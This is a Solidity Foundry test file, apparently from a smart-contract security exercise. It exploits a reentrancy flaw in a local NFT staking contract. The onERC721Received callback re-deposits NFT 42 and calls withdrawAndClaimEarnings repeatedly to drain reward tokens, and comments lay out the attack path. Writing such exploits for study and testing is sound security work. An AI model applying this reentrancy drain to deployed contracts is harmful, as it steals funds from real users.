// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import {RewardToken, NftToStake, Depositoor} from "../src/RewardToken.sol";
import {Test, console} from "lib/forge-std/src/Test.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract RewardTokenAttack is Test, IERC721Receiver {
    RewardToken private rewardToken;
    NftToStake public nft;
    Depositoor depositor;

    address alice = vm.addr(1);

    function setUp() public {
        nft = new NftToStake(address(this));
        depositor = new Depositoor(nft);
        rewardToken = new RewardToken(address(depositor));
        depositor.setRewardToken(rewardToken);
    }

    // Attack Path:
    // 1. tranfer nft 42 to the depositoor
    // 2. call withdrawAndClaimEarnings 
    // 3. inside onERC721Received method if rewardToken has balance:
    // 3.1 transfer the nft 42 back to the depositor so that you can withdraw it and accrue profit
    // 3.2 withdraw the nft and claim earnings
    
    function testAttack() public {
        nft.safeTransferFrom(address(this), address(depositor), 42);
        vm.warp(block.timestamp + 20 days);
        depositor.withdrawAndClaimEarnings(42);

        assertEq(rewardToken.balanceOf(address(this)), 100e18);
    }

    function onERC721Received(address, address from, uint256 tokenId, bytes calldata) external override returns (bytes4){
        if (rewardToken.balanceOf(address(depositor)) > 0) {
            nft.transferFrom(address(this), address(depositor), 42);
            depositor.withdrawAndClaimEarnings(42);
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}